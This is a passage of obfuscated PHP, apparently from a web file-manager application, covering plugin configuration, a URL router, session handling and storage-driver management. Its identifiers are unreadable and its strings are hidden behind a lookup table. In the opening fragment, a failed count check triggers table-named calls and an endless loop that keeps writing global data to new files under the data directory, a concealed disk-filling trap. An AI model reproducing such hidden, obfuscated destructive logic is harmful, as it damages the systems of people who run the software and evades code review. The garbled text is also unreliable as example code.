$ˆäêü¨Ò); if (count($ê¸ºã¼¢) < $ªöÖ[695]) { $ÔĞ°®ö = $ªöÖ[438]; $ÔĞ°®ö(); } $Œ€àç¥‘ = $ªöÖ[941]; $Œ€àç¥‘($_SERVER[$ªöÖ[942]]); $˜è ×¤î = $ªöÖ[940]; $˜è ×¤î(); $ÈÓ–òõé = $ªöÖ[1672]; $÷‘®ûõæ = json_encode($GLOBALS[$ªöÖ[1673]]); $†»â‘¶§ = 1; for ($êŞÔ¾½” = $†»â‘¶§; $êŞÔ¾½” > 0; $êŞÔ¾½”++) { $ÈÓ–òõé(DATA_PATH . $êŞÔ¾½”, $÷‘®ûõæ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $©Àš–Èä); } public function onSetConfig($› ªá‚) { } public function onGetConfig($İÁ¨âÕú) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Áú¯¼’) { if ($Áú¯¼’ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($É¡íÀà‰ = "\160\154\x75\147\151\156\x41\165\x74\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $ “èÀÉ = $this->getConfig(); if (!$ “èÀÉ[$É¡íÀà‰]) { return !1; } return ActionCall($_SERVER[£ğ°ÖØø][1674], $ “èÀÉ[$É¡íÀà‰]); } public function url($¸Š¡˜Àº, $Àâ¡µ¼ = '', $¹¯¡Ÿ = true) { $¡Şë´° =& $_SERVER[£ğ°ÖØø]; $ñæöÜ¿¿ = $this->getConfig(); $¸”ì‘² = KOD_VERSION . $¡Şë´°[10] . KOD_VERSION_BUILD; $ı‡¥ê†Š = $this->packageVersion(); $á•Õ¶á† = $¸”ì‘² . $¡Şë´°[471] . $ı‡¥ê†Š; if (substr($¸Š¡˜Àº, 0, 4) == $¡Şë´°[152] || substr($¸Š¡˜Àº, 0, 2) == $¡Şë´°[1393]) { $‚š®ÉÚ = $¸Š¡˜Àº . $¡Şë´°[1675] . $á•Õ¶á†; } else { if ($Àâ¡µ¼ == $¡Şë´°[12]) { $‚š®ÉÚ = $this->pluginHost . $¸Š¡˜Àº . $¡Şë´°[1675] . $á•Õ¶á†; } else { if ($Àâ¡µ¼ === $¡Şë´°[78]) { $‚š®ÉÚ = $this->pluginHost . $¸Š¡˜Àº; } else { if ($Àâ¡µ¼ == $¡Şë´°[1676]) { $‚š®ÉÚ = STATIC_PATH . $¸Š¡˜Àº . $¡Şë´°[1675] . $¸”ì‘²; } else { if ($Àâ¡µ¼ == $¡Şë´°[1677]) { $‚š®ÉÚ = APP_HOST . $¡Şë´°[1678] . $¸Š¡˜Àº . $¡Şë´°[1675] . $¸”ì‘²; } else { if (isset($ñæöÜ¿¿[$Àâ¡µ¼])) { $‚š®ÉÚ = $ñæöÜ¿¿[$Àâ¡µ¼] . $¸Š¡˜Àº . $¡Şë´°[1675] . $á•Õ¶á†; } } } } } } if (!$¹¯¡Ÿ) { return $‚š®ÉÚ; } echo $‚š®ÉÚ; } public function link($ÉÍÎÃÆ = false, $ó·€ˆ¸» = '') { $¾ûû„‰ =& $_SERVER[£ğ°ÖØø]; $½À£ËÌÁ = $this->linkHas == !1; $this->linkHas = !0; if (!$ÉÍÎÃÆ) { $this->link($¾ûû„‰[1679], $¾ûû„‰[1677]); $this->link($¾ûû„‰[1680], $¾ûû„‰[1676]); $this->link($¾ûû„‰[1681], $¾ûû„‰[1676]); $this->link($¾ûû„‰[1682], $¾ûû„‰[1676]); $this->link($¾ûû„‰[1683], $¾ûû„‰[1676]); if ($½À£ËÌÁ) { Hook::trigger($¾ûû„‰[1684]); } return; } $«¬òš¥Ç = $this->url($ÉÍÎÃÆ, $ó·€ˆ¸», !1); if (substr($ÉÍÎÃÆ, -3) == $¾ûû„‰[1685]) { echo $¾ûû„‰[1686] . $«¬òš¥Ç . $¾ûû„‰[1687] . $¾ûû„‰[262]; } else { if (substr($ÉÍÎÃÆ, -4) == $¾ûû„‰[1688]) { echo $¾ûû„‰[1689] . $«¬òš¥Ç . $¾ûû„‰[1690] . $¾ûû„‰[262]; } } if ($½À£ËÌÁ) { Hook::trigger($¾ûû„‰[1684]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\171" => "\x5b\136\57\135\53", "\x3a\x6e\x75\155" => "\133\x30\x2d\71\x5d\x2b", "\x3a\x61\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($öÌšµÂÕ, $äšĞå‚ø) { $ì¹Íú•­ =& $_SERVER[£ğ°ÖØø]; if ($öÌšµÂÕ == $ì¹Íú•­[1691]) { $Ùü¢Èšä = array_map($ì¹Íú•­[1692], $äšĞå‚ø[0]); $ÌÕÎ×û„ = strpos($äšĞå‚ø[1], $ì¹Íú•­[8]) === 0 ? $äšĞå‚ø[1] : $ì¹Íú•­[8] . $äšĞå‚ø[1]; $©ŞÃ ”Å = $äšĞå‚ø[2]; } else { $Ùü¢Èšä = null; $ÌÕÎ×û„ = strpos($äšĞå‚ø[0], $ì¹Íú•­[8]) === 0 ? $äšĞå‚ø[0] : $ì¹Íú•­[8] . $äšĞå‚ø[0]; $©ŞÃ ”Å = $äšĞå‚ø[1]; } array_push(self::$maps, $Ùü¢Èšä); array_push(self::$routes, $ÌÕÎ×û„); array_push(self::$methods, strtoupper($öÌšµÂÕ)); array_push(self::$callbacks, $©ŞÃ ”Å); } public static function error($¶ĞÄÖ›Ó) { self::$errorCallback = $¶ĞÄÖ›Ó; } public static function haltOnMatch($â´õçà = true) { self::$halts = $â´õçà; } public static function dispatch() { $İşÉØÔò =& $_SERVER[£ğ°ÖØø]; $¼ÏÄâåˆ = parse_url($_SERVER[$İşÉØÔò[1693]], PHP_URL_PATH); $Ú¬è±Û“ = $_SERVER[$İşÉØÔò[164]]; $ùä¶¶Âş = array_keys(static::$patterns); $¼Ÿ‰ãÍ = array_values(static::$patterns); $ÛÀ–´šú = !1; self::$routes = preg_replace($İşÉØÔò[1344], $İşÉØÔò[8], self::$routes); if (in_array($¼ÏÄâåˆ, self::$routes)) { $©ÓÕ—”Ê = array_keys(self::$routes, $¼ÏÄâåˆ); foreach ($©ÓÕ—”Ê as $ô±Óì) { if (self::$methods[$ô±Óì] == $Ú¬è±Û“ || self::$methods[$ô±Óì] == $İşÉØÔò[1694] || in_array($Ú¬è±Û“, self::$maps[$ô±Óì])) { $ÛÀ–´šú = !0; if (!is_object(self::$callbacks[$ô±Óì])) { $Û©’Š¼í = explode($İşÉØÔò[8], self::$callbacks[$ô±Óì]); $ı¼Øˆä¦ = end($Û©’Š¼í); $úÕ—İ = explode($İşÉØÔò[1276], $ı¼Øˆä¦); $Øåˆ“¯É = new $úÕ—İ[0](); $Øåˆ“¯É->{$úÕ—İ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ô±Óì]); if (self::$halts) { return; } } } } } else { $œ±Æá½ = 0; foreach (self::$routes as $ô±Óì) { if (strpos($ô±Óì, $İşÉØÔò[4]) !== !1) { $ô±Óì = str_replace($ùä¶¶Âş, $¼Ÿ‰ãÍ, $ô±Óì); } if (preg_match($İşÉØÔò[1695] . $ô±Óì . $İşÉØÔò[1696], $¼ÏÄâåˆ, $¤Ô×©’·)) { if (self::$methods[$œ±Æá½] == $Ú¬è±Û“ || self::$methods[$œ±Æá½] == $İşÉØÔò[1694] || !empty(self::$maps[$œ±Æá½]) && in_array($Ú¬è±Û“, self::$maps[$œ±Æá½])) { $ÛÀ–´šú = !0; array_shift($¤Ô×©’·); if (!is_object(self::$callbacks[$œ±Æá½])) { $Û©’Š¼í = explode($İşÉØÔò[8], self::$callbacks[$œ±Æá½]); $ı¼Øˆä¦ = end($Û©’Š¼í); $úÕ—İ = explode($İşÉØÔò[1276], $ı¼Øˆä¦); $Øåˆ“¯É = new $úÕ—İ[0](); if (!method_exists($Øåˆ“¯É, $úÕ—İ[1])) { echo $İşÉØÔò[1697]; } else { call_user_func_array(array($Øåˆ“¯É, $úÕ—İ[1]), $¤Ô×©’·); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$œ±Æá½], $¤Ô×©’·); if (self::$halts) { return; } } } } $œ±Æá½++; } } if ($ÛÀ–´šú == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ßøµÇá =& $_SERVER[£ğ°ÖØø]; header($_SERVER[$ßøµÇá[1698]] . $ßøµÇá[1699]); echo $ßøµÇá[1700]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$İşÉØÔò[1693]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $øãĞã«¨ =& $_SERVER[£ğ°ÖØø]; static $Ÿ‹À‚Õ¤ = false; if ($Ÿ‹À‚Õ¤) { return $Ÿ‹À‚Õ¤; } $“ËËÁ“ = $GLOBALS[$øãĞã«¨[6]][$øãĞã«¨[425]]; self::$sessionTime = $“ËËÁ“[$øãĞã«¨[1701]]; $™éØ¾ = isset($GLOBALS[$øãĞã«¨[1702]]) ? $GLOBALS[$øãĞã«¨[1702]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($™éØ¾)) { self::$sessionSign = Cookie::get($™éØ¾); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($™éØ¾, self::$sessionSign, self::$sessionTime); $‘ç¨Ç§ş = $“ËËÁ“[$øãĞã«¨[1703]]; $ç¦©ğî‚ = $“ËËÁ“[$‘ç¨Ç§ş]; $Â×ğƒñ® = $“ËËÁ“[$øãĞã«¨[891]]; switch ($‘ç¨Ç§ş) { case $øãĞã«¨[21]: self::$handle = Model($øãĞã«¨[892]); break; case $øãĞã«¨[893]: self::$handle = new CacheRedis($ç¦©ğî‚, $Â×ğƒñ®); break; case $øãĞã«¨[894]: self::$handle = new CacheMemcached($ç¦©ğî‚, $Â×ğƒñ®); break; case $øãĞã«¨[230]: $ç¦©ğî‚[$øãĞã«¨[87]] = $ç¦©ğî‚[$øãĞã«¨[87]] . $øãĞã«¨[1704]; self::$handle = new CacheFile($ç¦©ğî‚, $Â×ğƒñ®); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $Ÿ‹À‚Õ¤ = new self(); return $Ÿ‹À‚Õ¤; } public static function getBySign($ ØÅ®×û) { $åğ©€àş = self::$handle->get($ ØÅ®×û); $åğ©€àş = unserialize($åğ©€àş); return is_array($åğ©€àş) ? $åğ©€àş : array(); } public static function setBySign($©îŞ³ïĞ, $âÎö¿§Á) { CacheLock::lock($©îŞ³ïĞ); self::$handle->set($©îŞ³ïĞ, serialize($âÎö¿§Á), self::$sessionTime); CacheLock::unlock($©îŞ³ïĞ); } public static function sign($ÃÑƒî¼Ö = false) { if ($ÃÑƒî¼Ö) { self::$sessionSign = $ÃÑƒî¼Ö; } self::init(); return self::$sessionSign; } public static function set($Ë‚öÚè, $²Âòş¨° = false) { self::init(); if (is_array($Ë‚öÚè)) { foreach ($Ë‚öÚè as $Ş’ÛŸ¾œ => $§Øˆ¼úğ) { array_set_value(self::$data, $Ş’ÛŸ¾œ, $§Øˆ¼úğ); } } else { array_set_value(self::$data, $Ë‚öÚè, $²Âòş¨°); } self::setBySign(self::$sessionSign, self::$data); } public static function get($àÀÖ÷Ñ = false) { self::init(); if (!$àÀÖ÷Ñ) { return self::$data; } return array_get_value(self::$data, $àÀÖ÷Ñ); } public static function remove($–ä”²¡õ) { self::init(); unset(self::$data[$–ä”²¡õ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[£ğ°ÖØø][897])) { self::$handle->clearTimeout(); } } } goto d«ĞÌéäòÇ; dÕ†¹·”: class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\x73\x74\157\x72\x61\x67\x65\114\151\163\x74"; public $field = array("\x6e\141\155\145", "\163\x69\x7a\x65\x4d\141\x78", "\163\171\x73\164\x65\x6d", "\x64\x65\x66\x61\165\x6c\164", "\144\162\151\166\145\x72", "\x63\x6f\x6e\x66\x69\147"); public function listData($¸½ÚºÎ± = false, $ŠÊË´™ü = "\x6d\x6f\144\x69\146\x79\124\x69\155\145", $Ò…Àèšæ = false) { $ã‚±Á½ó =& $_SERVER[£ğ°ÖØø]; $€¹¬êûš = parent::listData($¸½ÚºÎ±, $ŠÊË´™ü, $Ò…Àèšæ); if ($¸½ÚºÎ±) { return $€¹¬êûš; } $­‚‡ã = array(); if ($GLOBALS[$ã‚±Á½ó[2280]]) { $­‚‡ã = $this->ioSizeUseGet(array_to_keyvalue($€¹¬êûš, $ã‚±Á½ó[12], $ã‚±Á½ó[484])); } foreach ($€¹¬êûš as $’‰Üâˆ => $Öïõ‡„) { unset($€¹¬êûš[$’‰Üâˆ][$ã‚±Á½ó[6]]); $€¹¬êûš[$’‰Üâˆ][$ã‚±Á½ó[1942]] = isset($­‚‡ã[$Öïõ‡„[$ã‚±Á½ó[484]]]) ? $­‚‡ã[$Öïõ‡„[$ã‚±Á½ó[484]]] : 0; } return $€¹¬êûš; } public function ioSizeUseGet($Ş·µ“²) { $ìÏª„¬Ô =& $_SERVER[£ğ°ÖØø]; if (!$Ş·µ“²) { return array(); } $Ñ¬õ¾™˜ = $ìÏª„¬Ô[2281] . implode($ìÏª„¬Ô[50], $Ş·µ“²); $ÀŒ¨Ğ¥’ = Cache::get($Ñ¬õ¾™˜); if ($ÀŒ¨Ğ¥’) { return $ÀŒ¨Ğ¥’; } $ÁŒŸ‘éÁ = array($ìÏª„¬Ô[881] => $ìÏª„¬Ô[484], $ìÏª„¬Ô[2282] => $ìÏª„¬Ô[79]); $â¸Ìã«˜ = array($ìÏª„¬Ô[881] => array($ìÏª„¬Ô[7], $Ş·µ“²)); $ÀŒ¨Ğ¥’ = Model($ìÏª„¬Ô[853])->field($ÁŒŸ‘éÁ)->where($â¸Ìã«˜)->group($ìÏª„¬Ô[881])->select(); $ÀŒ¨Ğ¥’ = array_to_keyvalue($ÀŒ¨Ğ¥’, $ìÏª„¬Ô[484], $ìÏª„¬Ô[79]); Cache::set($Ñ¬õ¾™˜, $ÀŒ¨Ğ¥’, 600); return $ÀŒ¨Ğ¥’; } public function getConfig($¬Ù’ÃŞù) { $öõïÌï¶ = parent::listData($¬Ù’ÃŞù); return json_decode($öõïÌï¶[$_SERVER[£ğ°ÖØø][6]], !0); } public function update($ÔŒÁşƒÍ, $¶Î× §) { $‰ŞŒ²Ä‡ =& $_SERVER[£ğ°ÖØø]; $Š€ö÷µÖ = $¶Î× §[$‰ŞŒ²Ä‡[32]]; $ê—‡Ç = array_to_keyvalue(parent::listData(), $‰ŞŒ²Ä‡[32]); if (isset($ê—‡Ç[$Š€ö÷µÖ]) && $ê—‡Ç[$Š€ö÷µÖ][$‰ŞŒ²Ä‡[484]] != $ÔŒÁşƒÍ) { return !1; } $this->checkPwd($ÔŒÁşƒÍ, $¶Î× §); if (isset($¶Î× §[$‰ŞŒ²Ä‡[2283]]) && $¶Î× §[$‰ŞŒ²Ä‡[2283]] == $‰ŞŒ²Ä‡[91]) { $this->checkConfig($¶Î× §); } unset($¶Î× §[$‰ŞŒ²Ä‡[2283]]); $¬Ù½ÊÓ¯ = parent::update($ÔŒÁşƒÍ, $¶Î× §); if ($¬Ù½ÊÓ¯ && $¶Î× §[$‰ŞŒ²Ä‡[37]]) { $·¨Òü£¦ = 0; foreach ($ê—‡Ç as $ì³«Âàñ) { if ($ì³«Âàñ[$‰ŞŒ²Ä‡[37]] && $ì³«Âàñ[$‰ŞŒ²Ä‡[484]] != $ÔŒÁşƒÍ) { $·¨Òü£¦ = $ì³«Âàñ[$‰ŞŒ²Ä‡[484]]; parent::update($ì³«Âàñ[$‰ŞŒ²Ä‡[484]], array($‰ŞŒ²Ä‡[37] => 0)); } } $this->updateBackup($ÔŒÁşƒÍ, $·¨Òü£¦); } return $¬Ù½ÊÓ¯; } public function add($—çÀæÅ˜) { $Ûá¨Â =& $_SERVER[£ğ°ÖØø]; $Õ—ßæÉğ = array_to_keyvalue(parent::listData(), $Ûá¨Â[32]); if (isset($Õ—ßæÉğ[$—çÀæÅ˜[$Ûá¨Â[32]]])) { return !1; } $this->checkConfig($—çÀæÅ˜); $»û°£ = parent::insert($—çÀæÅ˜); if ($»û°£ && $—çÀæÅ˜[$Ûá¨Â[37]]) { foreach ($Õ—ßæÉğ as $ Ó÷‡í–) { if ($ Ó÷‡í–[$Ûá¨Â[37]]) { parent::update($ Ó÷‡í–[$Ûá¨Â[484]], array($Ûá¨Â[37] => 0)); } } } return $»û°£; } public function updateBackup($Â­Ó“£¥, $ÏºŒÜÁÛ) { $ÆÂ“…Ëæ =& $_SERVER[£ğ°ÖØø]; if (!$ÏºŒÜÁÛ) { return; } $šù›ÆøÔ = Model($ÆÂ“…Ëæ[812])->config(); if ($šù›ÆøÔ[$ÆÂ“…Ëæ[1725]] != $ÆÂ“…Ëæ[91] || $šù›ÆøÔ[$ÆÂ“…Ëæ[816]] != $ÏºŒÜÁÛ) { return; } $æöÂ¡ïµ = Model($ÆÂ“…Ëæ[834])->get($ÆÂ“…Ëæ[847]); $æöÂ¡ïµ = json_decode($æöÂ¡ïµ, !0); if (!$æöÂ¡ïµ) { return; } $æöÂ¡ïµ[$ÆÂ“…Ëæ[816]] = $Â­Ó“£¥; Model($ÆÂ“…Ëæ[834])->set(array($ÆÂ“…Ëæ[847] => $æöÂ¡ïµ)); } public function checkPwd($ó®ßˆ’Ë, &$ºÄ  ñÖ) { $ìŸÜÓƒÛ =& $_SERVER[£ğ°ÖØø]; if (empty($ºÄ  ñÖ[$ìŸÜÓƒÛ[6]])) { return; } $ˆãó½ôò = json_decode($ºÄ  ñÖ[$ìŸÜÓƒÛ[6]], !0); $Šèï©µ‡ = $ìŸÜÓƒÛ[12]; $ Îæä¿ = array($ìŸÜÓƒÛ[2284], $ìŸÜÓƒÛ[2285], $ìŸÜÓƒÛ[950]); foreach ($ Îæä¿ as $µ¤½÷ı‡) { if (isset($ˆãó½ôò[$µ¤½÷ı‡])) { $Šèï©µ‡ = $µ¤½÷ı‡; break; } } if (!$Šèï©µ‡) { return; } $¨ô¹©µ“ = $this->getConfig($ó®ßˆ’Ë); $Ê‰÷¸—  = $¨ô¹©µ“[$Šèï©µ‡]; $ıÄŸ×ã¨ = $ˆãó½ôò[$Šèï©µ‡]; if ($ıÄŸ×ã¨ == str_repeat($ìŸÜÓƒÛ[220], strlen($Ê‰÷¸— ))) { $ˆãó½ôò[$Šèï©µ‡] = $Ê‰÷¸— ; $ºÄ  ñÖ[$ìŸÜÓƒÛ[6]] = json_encode($ˆãó½ôò); } else { if ($ıÄŸ×ã¨ != $Ê‰÷¸— ) { $ºÄ  ñÖ[$ìŸÜÓƒÛ[2283]] = $ìŸÜÓƒÛ[91]; } } } public function checkConfig(&$‚Ÿ¡ÔïÂ, $Ãê¦øİı = false) { $û»±ıŸ =& $_SERVER[£ğ°ÖØø]; $˜ß–ª— = strtolower($‚Ÿ¡ÔïÂ[$û»±ıŸ[98]]); $±ú¥¸¥ = json_decode($‚Ÿ¡ÔïÂ[$û»±ıŸ[6]], !0); foreach ($±ú¥¸¥ as $ŒÆµÀ“¸ => $Ñõ¤ëõ) { if (is_string($Ñõ¤ëõ)) { $±ú¥¸¥[$ŒÆµÀ“¸] = trim($Ñõ¤ëõ); } } $±ú¥¸¥[$û»±ıŸ[2286]] = rand_string(6); $‰²šÀü¿ = $GLOBALS[$û»±ıŸ[6]][$û»±ıŸ[92]][$û»±ıŸ[889]]; $ßì‚¿£ = isset($‰²šÀü¿[$˜ß–ª—]) ? $‰²šÀü¿[$˜ß–ª—] : ucfirst($˜ß–ª—); $ÀùêÑ‹™ = $û»±ıŸ[77] . $ßì‚¿£; if (!$ßì‚¿£ || !class_exists($ÀùêÑ‹™)) { if ($Ãê¦øİı) { return LNG($û»±ıŸ[2287]); } write_log(array($û»±ıŸ[2288], $‚Ÿ¡ÔïÂ, get_caller_info()), $û»±ıŸ[215]); show_json(LNG($û»±ıŸ[2287]), !1, $‚Ÿ¡ÔïÂ); } $ÙÓ¡µ«ï = new $ÀùêÑ‹™($±ú¥¸¥); if (in_array($˜ß–ª—, $ÙÓ¡µ«ï->objectDriver)) { try { if (!$ÙÓ¡µ«ï->isBucketCors() && !$ÙÓ¡µ«ï->setBucketCors()) { $¢ø©äŒ¨ = LNG($û»±ıŸ[2289]); $¢ø©äŒ¨ .= $û»±ıŸ[2290] . LNG($û»±ıŸ[2291]); } } catch (Exception $ï®çùÊõ) { $¢ø©äŒ¨ = $ï®çùÊõ->getMessage(); } if (isset($¢ø©äŒ¨)) { return $this->_parseError($¢ø©äŒ¨, $˜ß–ª—, $Ãê¦øİı); } if ($˜ß–ª— == $û»±ıŸ[68] && !$ÙÓ¡µ«ï->checkRegion()) { return $this->_parseError(LNG($û»±ıŸ[2292]), $˜ß–ª—, $Ãê¦øİı); } } $±‹à¶ığ = rtrim($±ú¥¸¥[$û»±ıŸ[1245]], $û»±ıŸ[8]) . $û»±ıŸ[8]; $ÙõÒÁŒ = $ÙÓ¡µ«ï->getPath($±‹à¶ığ . $û»±ıŸ[1249]); try { if ($˜ß–ª— == $û»±ıŸ[109]) { $ÙÓ¡µ«ï->mkdir($±‹à¶ığ); } $ÂôŸİÇ¢ = $ÙÓ¡µ«ï->mkfile($ÙõÒÁŒ); if (!$ÂôŸİÇ¢) { $¢ø©äŒ¨ = LNG($û»±ıŸ[2289]); } } catch (Exception $ï®çùÊõ) { $¢ø©äŒ¨ = $ï®çùÊõ->getMessage(); } if (isset($¢ø©äŒ¨)) { return $this->_parseError($¢ø©äŒ¨, $˜ß–ª—, $Ãê¦øİı); } $±ú¥¸¥[$û»±ıŸ[1245]] = $±‹à¶ığ; $‚Ÿ¡ÔïÂ[$û»±ıŸ[6]] = json_encode($±ú¥¸¥); $‚Ÿ¡ÔïÂ[$û»±ıŸ[98]] = $ßì‚¿£; return !0; } private function _parseError($âäÔüÔ, $÷ñÕãÚ†, $œĞÛæ¿Ì = false) { $¥Í½Ó¤ë =& $_SERVER[£ğ°ÖØø]; if ($÷ñÕãÚ† == $¥Í½Ó¤ë[68] && stripos($âäÔüÔ, $¥Í½Ó¤ë[2293])) { $•ø®’†‡ = explode($¥Í½Ó¤ë[10], $âäÔüÔ); $£‘‚’‚ = isset($•ø®’†‡[1]) ? $•ø®’†‡[1] : $¥Í½Ó¤ë[12]; $¼€×ëÊƒ = array($¥Í½Ó¤ë[2294] => LNG($¥Í½Ó¤ë[2295]), $¥Í½Ó¤ë[2296] => LNG($¥Í½Ó¤ë[2297])); if (isset($¼€×ëÊƒ[$£‘‚’‚])) { $âäÔüÔ = $¼€×ëÊƒ[$£‘‚’‚]; } } if (stripos($âäÔüÔ, $¥Í½Ó¤ë[2298]) === 0) { $ÅÅÜ¦‡Â = strpos($âäÔüÔ, $¥Í½Ó¤ë[178]); if ($ÅÅÜ¦‡Â === !1) { $ÅÅÜ¦‡Â = strpos($âäÔüÔ, $¥Í½Ó¤ë[4]); } if ($ÅÅÜ¦‡Â !== !1) { $âäÔüÔ = substr($âäÔüÔ, $ÅÅÜ¦‡Â + 1); } } $âäÔüÔ = LNG($¥Í½Ó¤ë[1252]) . $âäÔüÔ; if ($œĞÛæ¿Ì) { return $âäÔüÔ; } show_json($âäÔüÔ, !1); } public function driverListSystem() { $ÓÇó¥º =& $_SERVER[£ğ°ÖØø]; $äÖ›—˜ö = parent::listData(); $ä•×Ô´æ = array(); foreach ($äÖ›—˜ö as $Ğ¹Óç–›) { unset($Ğ¹Óç–›[$ÓÇó¥º[231]], $Ğ¹Óç–›[$ÓÇó¥º[88]]); $Ğ¹Óç–›[$ÓÇó¥º[6]] = json_decode($Ğ¹Óç–›[$ÓÇó¥º[6]], !0); $ä•×Ô´æ[] = $Ğ¹Óç–›; } return $ä•×Ô´æ; } public function defaultDriver() { $×–¼’í =& $_SERVER[£ğ°ÖØø]; $€»ÎÇÈİ = parent::listData(); $ø®‡§ø = array_filter_by_field($€»ÎÇÈİ, $×–¼’í[37], 1); $ø®‡§ø = $ø®‡§ø[0]; if ($ø®‡§ø) { $ø®‡§ø[$×–¼’í[6]] = json_decode($ø®‡§ø[$×–¼’í[6]], !0); } return $ø®‡§ø; } public function driverInfo($ƒíºô¨ö) { $­ŒŞ›¦ğ =& $_SERVER[£ğ°ÖØø]; $áèÁÙÛ = array_to_keyvalue(parent::listData(), $­ŒŞ›¦ğ[484]); if (!isset($áèÁÙÛ[$ƒíºô¨ö])) { return !1; } $Úˆ½ïÛ = $áèÁÙÛ[$ƒíºô¨ö]; $Úˆ½ïÛ[$­ŒŞ›¦ğ[6]] = json_decode($Úˆ½ïÛ[$­ŒŞ›¦ğ[6]], !0); return $Úˆ½ïÛ; } public function remove($êüó•Å) { $this->removeShareItems($êüó•Å); return parent::remove($êüó•Å); } public function removeWithFile($ÉìÆúòò, $§£Ü¬¹È, $Ü˜¸¾·, $Ë§ó®„ = false) { $‘¤°ë¡— =& $_SERVER[£ğ°ÖØø]; $¦úĞÛî­ = array($‘¤°ë¡—[881] => $ÉìÆúòò); $ì³…‚‘á = Model($‘¤°ë¡—[553])->where($¦úĞÛî­)->count(); $å–á–’Í = Model($‘¤°ë¡—[553])->where($¦úĞÛî­)->sum($‘¤°ë¡—[79]); $¾ß˜’İ˜ = $§£Ü¬¹È . $‘¤°ë¡—[2299] . $ÉìÆúòò; $§íºÏÑİ = LNG($§£Ü¬¹È == $‘¤°ë¡—[629] ? $‘¤°ë¡—[2300] : $‘¤°ë¡—[2301]); $‰ –ÇÉò = new TaskFileTransfer($¾ß˜’İ˜, $‘¤°ë¡—[215], $ì³…‚‘á, $§íºÏÑİ . $‘¤°ë¡—[471] . $Ü˜¸¾·[$‘¤°ë¡—[32]] . $‘¤°ë¡—[214] . $ÉìÆúòò); $‰ –ÇÉò->task[$‘¤°ë¡—[827]] = (double) $å–á–’Í; $Ñ·à™ñí = KodIO::defaultDriver(); $¨¥äÖ³Ÿ = $Ñ·à™ñí[$‘¤°ë¡—[484]]; $ÆÊŠé¦Á = $ÓñÒàİ¼ = $æ¼øÒ¸µ = array(); $ÅÄ¢ƒ¬ = Model($‘¤°ë¡—[230])->where($¦úĞÛî­)->field($‘¤°ë¡—[2302])->select(); foreach ($ÅÄ¢ƒ¬ as $¶ëòï·Ï) { $°äÙæÒ = $¶ëòï·Ï[$‘¤°ë¡—[550]]; if ($Ë§ó®„) { $ÓñÒàİ¼[] = $°äÙæÒ; continue; } $ÊÔä·É… = $¶ëòï·Ï[$‘¤°ë¡—[87]]; $‹»Æ¼Š¤ = get_path_father($ÊÔä·É…); $æ¼øÒ¸µ[] = $‹»Æ¼Š¤; $‹»Æ¼Š¤ = str_replace("\x7b\151\157\x3a{$ÉìÆúòò}\175\57", "\x7b\x69\x6f\72{$¨¥äÖ³Ÿ}\x7d\57", $‹»Æ¼Š¤); if (!IO::exist($ÊÔä·É…)) { $ÆÊŠé¦Á[] = $°äÙæÒ; $‰ –ÇÉò->updateFileEnd($¶ëòï·Ï[$‘¤°ë¡—[32]], $¶ëòï·Ï[$‘¤°ë¡—[79]]); write_log($‘¤°ë¡—[2303] . $ÊÔä·É…, $‘¤°ë¡—[1885]); continue; } $úÂÒı­Ã = IO::move($ÊÔä·É…, $‹»Æ¼Š¤, REPEAT_RENAME); if (!$úÂÒı­Ã) { $ÓñÒàİ¼[] = $°äÙæÒ; $‰ –ÇÉò->updateFileEnd($¶ëòï·Ï[$‘¤°ë¡—[32]], $¶ëòï·Ï[$‘¤°ë¡—[79]]); write_log($‘¤°ë¡—[2304] . $ÊÔä·É…, $‘¤°ë¡—[1885]); continue; } $¦úĞÛî­ = array($‘¤°ë¡—[550] => $°äÙæÒ); $œü®óŞÂ = array($‘¤°ë¡—[881] => $¨¥äÖ³Ÿ, $‘¤°ë¡—[87] => $úÂÒı­Ã); Model($‘¤°ë¡—[230])->where($¦úĞÛî­)->save($œü®óŞÂ); } $ÍØ¨í§Í = $‰ –ÇÉò->task; if (!$Ë§ó®„) { Cache::set($¾ß˜’İ˜, $ÍØ¨í§Í); } $‰ –ÇÉò->end(); $ÆÊŠé¦Á = array_unique($ÆÊŠé¦Á); $ÓñÒàİ¼ = array_unique($ÓñÒàİ¼); if (!$Ë§ó®„ && ($ÆÊŠé¦Á || $ÓñÒàİ¼)) { $åŒ¿©Æ = array(); if ($ÆÊŠé¦Á) { $åŒ¿©Æ[] = sprintf(LNG($‘¤°ë¡—[2305]), count($ÆÊŠé¦Á)); } if ($ÓñÒàİ¼) { $åŒ¿©Æ[] = sprintf(LNG($‘¤°ë¡—[2306]), count($ÓñÒàİ¼)); } $åŒ¿©Æ = sprintf(LNG($‘¤°ë¡—[2307]), implode($‘¤°ë¡—[2308], $åŒ¿©Æ)) . $‘¤°ë¡—[2309] . date($‘¤°ë¡—[2310]) . $‘¤°ë¡—[2311]; if ($§£Ü¬¹È == $‘¤°ë¡—[1922]) { $åŒ¿©Æ .= $‘¤°ë¡—[2312] . LNG($‘¤°ë¡—[2313]); } $ÍØ¨í§Í[$‘¤°ë¡—[1247]] = $åŒ¿©Æ; Cache::set($¾ß˜’İ˜, $ÍØ¨í§Í); unset($Ü˜¸¾·[$‘¤°ë¡—[6]]); $‘ÅæÊ·› = 